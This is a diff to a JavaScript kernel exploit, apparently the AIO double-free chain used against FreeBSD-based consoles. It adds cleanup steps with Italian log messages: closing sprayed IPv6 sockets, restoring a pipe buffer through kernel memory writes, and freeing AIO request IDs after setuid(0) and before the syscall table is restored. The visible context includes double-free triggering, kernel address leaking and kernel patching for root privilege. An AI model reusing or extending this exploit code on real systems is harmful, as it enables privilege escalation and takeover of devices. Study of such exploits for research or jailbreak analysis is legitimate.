@@ -419,11 +419,18 @@ function set_rthdr(sd, buf, len) {
 }
 
 function free_rthdrs(sds) {
+    try {
     for (const sd of sds) {
-        setsockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, 0, 0);
+        
         setsockopt(sd, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
-        setsockopt(sd, IPPROTO_IPV6, IPV6_PKTINFO, 0, 0);
+        setsockopt(sd, IPPROTO_IPV6, IPV6_PKTINFO,       0, 0);
+        setsockopt(sd, IPPROTO_IPV6, IPV6_RTHDR,         0, 0);
+        close(sd);
     }
+    log("✅ Tutti i socket in `sds` sono stati chiusi");
+} catch (e) {
+    log(`⚠️ Errore chiusura socket residui: ${e}`);
+   }
 }
 
 function build_rthdr(buf, size) {
@@ -731,6 +738,9 @@ function double_free_reqs2(sds) {
         }
     }
 
+
+
+    
     die('failed aio double free');
 }
 
@@ -956,6 +966,8 @@ function leak_kernel_addrs(sd_pair) {
     cancel_aios(to_cancel_p, to_cancel_len);
     free_aios2(leak_ids_p, leak_ids_len);
 
+ 
+    
     return [reqs1_addr, kbuf_addr, kernel_addr, target_id, evf];
 }
 
@@ -1606,6 +1618,49 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
 
     log('setuid(0)');
     sysi('setuid', 0);
+
+try {
+    const [kpipe, pipe_save] = restore_info;
+    for (let off = 0; off < pipe_save.size; off += 8) {
+        const old_val = pipe_save.read64(off);
+        kmem.write64(kpipe.add(off), old_val);
+    }
+    log("✅ Pipebuf ripristinato con successo");
+} catch (e) {
+    log(`⚠️ Errore ripristino pipebuf: ${e}`);
+}
+
+    // --- LIBERAZIONE COMPLETA AIO IDs ---
+try {
+   
+    if (typeof block_id !== "undefined" && block_id !== null) {
+       
+        aio_multi_cancel(block_id.addr, 1);
+        aio_multi_poll(block_id.addr,   1);
+        aio_multi_delete(block_id.addr, 1);
+    }
+    if (typeof groom_ids !== "undefined" && groom_ids !== null) {
+       
+        const gcount = groom_ids.length;
+        const gp = groom_ids.addr;
+        aio_multi_cancel(gp, gcount);
+        aio_multi_poll(  gp, gcount);
+        aio_multi_delete(gp, gcount);
+    }
+ 
+    if (typeof leak_ids !== "undefined" && leak_ids !== null) {
+        const lcount = leak_ids.length;
+        const lp = leak_ids.addr;
+        aio_multi_cancel(lp, lcount);
+        aio_multi_poll(  lp, lcount);
+        aio_multi_delete(lp, lcount);
+    }
+    log("✅ AIO IDs (block_id, groom_ids, leak_ids) liberati");
+} catch (e) {
+    log(`⚠️ Errore liberazione AIO IDs finali: ${e}`);
+}
+
+    
     log('kernel exploit succeeded!');
     log('restore sys_aio_submit()');
     kmem.write32(sysent_661, sy_narg);
